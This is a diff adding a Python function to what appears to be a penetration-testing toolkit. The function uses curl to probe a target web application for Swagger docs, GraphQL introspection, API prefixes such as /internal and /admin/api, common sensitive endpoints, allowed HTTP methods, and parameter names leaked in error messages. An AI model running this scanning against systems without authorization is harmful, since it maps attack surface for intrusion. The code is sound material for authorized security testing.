+            "/docs", "/redoc", "/api/docs", "/api/schema",
+            "/_catalog", "/api/swagger.json",
+        ]
+        for path in swagger_paths:
+            probe_url = f"{url.rstrip('/')}{path}"
+            probe_cmd = ["curl", "-sk", "--max-time", "8", "-w", "\n%{http_code}", probe_url]
+            result = run_command_advanced(probe_cmd, timeout=12, trace=trace)
+            stdout = result.get("stdout", "")
+            parts = stdout.rsplit("\n", 1)
+            status = parts[-1] if len(parts) > 1 else ""
+            body = parts[0] if len(parts) > 1 else stdout
+            
+            if status == "200" and len(body) > 50:
+                api_docs[path] = {"status": "found", "size": len(body)}
+                # Try to parse endpoints from swagger
+                try:
+                    swagger_data = json.loads(body)
+                    if "paths" in swagger_data:
+                        for api_path in swagger_data["paths"]:
+                            methods = list(swagger_data["paths"][api_path].keys())
+                            discovered_endpoints.append({
+                                "path": api_path, "methods": methods,
+                                "source": "swagger", "status": "documented"
+                            })
+                except (json.JSONDecodeError, KeyError):
+                    pass
+    
+    # Step 2: GraphQL detection
+    progress.update("GraphQL endpoint detection")
+    if include_graphql:
+        graphql_paths = ["/graphql", "/graphiql", "/playground", "/api/graphql", "/gql", "/query"]
+        for path in graphql_paths:
+            gql_url = f"{url.rstrip('/')}{path}"
+            # Test introspection query
+            gql_cmd = ["curl", "-sk", "--max-time", "10", "-X", "POST",
+                      "-H", "Content-Type: application/json",
+                      "-d", '{"query":"{ __schema { types { name } } }"}',
+                      gql_url]
+            result = run_command_advanced(gql_cmd, timeout=15, trace=trace)
+            if result["success"] and "__schema" in result.get("stdout", ""):
+                api_docs["graphql"] = {"path": path, "introspection": True}
+                discovered_endpoints.append({
+                    "path": path, "methods": ["POST"],
+                    "source": "graphql", "status": "introspection_enabled",
+                    "severity": "HIGH"
+                })
+    
+    # Step 3: API prefix enumeration
+    progress.update("API prefix enumeration")
+    api_prefixes = [
+        "/api", "/api/v1", "/api/v2", "/api/v3",
+        "/rest", "/rest/v1", "/v1", "/v2", "/v3",
+        "/internal", "/private", "/admin/api",
+    ]
+    found_prefixes = []
+    
+    for prefix in api_prefixes:
+        prefix_url = f"{url.rstrip('/')}{prefix}"
+        prefix_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null", "-w", "%{http_code}", prefix_url]
+        result = run_command_advanced(prefix_cmd, timeout=10, trace=trace)
+        status = result.get("stdout", "").strip()
+        if status not in ["404", "000"]:
+            found_prefixes.append({"prefix": prefix, "status": status})
+            discovered_endpoints.append({
+                "path": prefix, "status_code": status,
+                "source": "prefix_enum", "type": "api_root"
+            })
+    
+    # Step 4: Common endpoint fuzzing under discovered prefixes
+    progress.update("Endpoint fuzzing under API prefixes")
+    common_endpoints = [
+        "users", "user", "admin", "auth", "login", "register", "signup",
+        "profile", "account", "settings", "config", "health", "status",
+        "info", "version", "search", "upload", "download", "file", "files",
+        "data", "export", "import", "backup", "logs", "events", "webhook",
+        "token", "refresh", "logout", "password", "reset", "verify",
+        "organizations", "teams", "roles", "permissions",
+    ]
+    
+    for prefix_info in found_prefixes[:3]:
+        prefix = prefix_info["prefix"]
+        for ep in common_endpoints:
+            ep_url = f"{url.rstrip('/')}{prefix}/{ep}"
+            ep_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", ep_url]
+            result = run_command_advanced(ep_cmd, timeout=8, trace=trace)
+            status = result.get("stdout", "").strip()
+            if status in ["200", "201", "401", "403", "405", "422"]:
+                discovered_endpoints.append({
+                    "path": f"{prefix}/{ep}", "status_code": status,
+                    "source": "fuzzing"
+                })
+    
+    # Step 5: Method probing on discovered endpoints
+    progress.update("Method probing")
+    method_findings = []
+    if include_method_probing:
+        http_methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
+        interesting_endpoints = [ep for ep in discovered_endpoints 
+                               if ep.get("status_code") in ["401", "403", "405"]][:5]
+        
+        for ep in interesting_endpoints:
+            ep_url = f"{url.rstrip('/')}{ep['path']}"
+            for method in http_methods:
+                m_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null",
+                        "-w", "%{http_code}", "-X", method, ep_url]
+                result = run_command_advanced(m_cmd, timeout=8, trace=trace)
+                status = result.get("stdout", "").strip()
+                if status not in ["404", "405", "000"]:
+                    method_findings.append({
+                        "path": ep["path"], "method": method, "status": status
+                    })
+    
+    # Step 6: Error-based parameter discovery
+    progress.update("Error-based parameter discovery")
+    param_hints = []
+    interesting_200s = [ep for ep in discovered_endpoints if ep.get("status_code") == "422"][:3]
+    
+    for ep in interesting_200s:
+        ep_url = f"{url.rstrip('/')}{ep['path']}"
+        # Send invalid JSON to get error hints
+        err_cmd = ["curl", "-sk", "--max-time", "8", "-X", "POST",
+                  "-H", "Content-Type: application/json",
+                  "-d", '{"invalid": true}', ep_url]
+        result = run_command_advanced(err_cmd, timeout=12, trace=trace)
+        body = result.get("stdout", "")
+        # Look for field names in error messages
+        field_patterns = re.findall(r'"([a-zA-Z_]+)"\s*(?:is required|missing|invalid|must be)', body)
+        if field_patterns:
+            param_hints.append({
+                "path": ep["path"], "discovered_params": field_patterns
+            })
+    
+    progress.update("Complete")
+    output = {
+        "status": "success",
+        "target": target,
+        "total_endpoints": len(discovered_endpoints),
+        "api_documentation": api_docs,
+        "discovered_prefixes": found_prefixes,
+        "discovered_endpoints": discovered_endpoints,
+        "method_findings": method_findings,
+        "param_hints": param_hints,
+        "graphql_detected": "graphql" in api_docs,
+        "swagger_detected": any("swagger" in k or "api-docs" in k for k in api_docs.keys()),
+        "summary": {
+            "accessible_200": len([e for e in discovered_endpoints if e.get("status_code") == "200"]),
+            "auth_required_401": len([e for e in discovered_endpoints if e.get("status_code") == "401"]),
+            "forbidden_403": len([e for e in discovered_endpoints if e.get("status_code") == "403"]),
+            "method_denied_405": len([e for e in discovered_endpoints if e.get("status_code") == "405"]),
+        },
+    }
+    
+    output = chain_engine.enrich_with_context("enhanced_api_discovery", target, output)
+    log_tool_execution("enhanced_api_discovery", target, inputs, output, trace, progress)
+    return json.dumps(output, indent=2)
+
+
+
 # ============================================================================
 # MAIN ENTRY POINT
 # ============================================================================
